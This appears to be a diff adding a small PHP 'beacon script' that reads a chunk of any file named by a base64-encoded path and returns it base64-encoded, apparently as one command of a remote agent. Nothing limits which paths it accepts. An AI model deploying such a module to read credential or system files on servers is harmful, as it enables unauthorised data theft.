@@ -1,0 +1,33 @@
+// Beacon script: get_file_chunk
+// Reads a chunk of a file and returns it base64-encoded.
+// $VARS['file']   = base64-encoded file path
+// $VARS['offset'] = byte offset to start reading from
+// $VARS['length'] = number of bytes to read
+
+$filePath = base64_decode($VARS['file'] ?? '');
+$offset = (int) ($VARS['offset'] ?? 0);
+$length = (int) ($VARS['length'] ?? 2097152); // 2MB default
+
+if (!file_exists($filePath)) {
+    return ['status' => 'error', 'error' => 'File not found'];
+}
+
+$fileSize = filesize($filePath);
+$handle = fopen($filePath, 'rb');
+
+if ($handle === false) {
+    return ['status' => 'error', 'error' => 'Cannot open file'];
+}
+
+fseek($handle, $offset);
+$data = fread($handle, $length);
+$bytesRead = strlen($data);
+$remaining = max(0, $fileSize - $offset - $bytesRead);
+fclose($handle);
+
+return [
+    'status'    => 'ok',
+    'data'      => base64_encode($data),
+    'remaining' => $remaining,
+    'total'     => $fileSize,
+];
